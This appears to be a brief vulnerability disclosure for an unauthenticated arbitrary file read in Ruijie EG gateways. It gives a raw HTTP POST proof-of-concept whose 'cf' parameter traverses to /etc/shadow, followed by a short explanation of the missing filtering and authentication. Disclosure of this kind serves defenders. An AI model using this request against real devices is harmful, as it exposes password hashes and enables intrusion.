**Ruijie-EG gateway has a foreground arbitrary file reading vulnerability**

official website:https://www.ruijie.com.cn/

POC
```
POST /local/auth/php/getCfile.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

cf=../../../etc/shadow
```

vulnerability analysis

1.cf parameters are carried directly into the function without filtering, resulting in arbitrary file read vulnerabilities

2, path /tmp/app_auth/cfile/ path concatenation into the variable cf, can be through.. / Does directory bypass

3. No session or token verification is performed, resulting in any file reading vulnerability in the foreground
4. 
![image](https://user-images.githubusercontent.com/129963609/230249232-a2c76b90-9fc7-4191-ba31-c4b8c14ce54e.png)

The bug reappears

![image](https://user-images.githubusercontent.com/129963609/230249639-f44a0d17-6d44-4854-8dd5-dc83277cf00d.png)






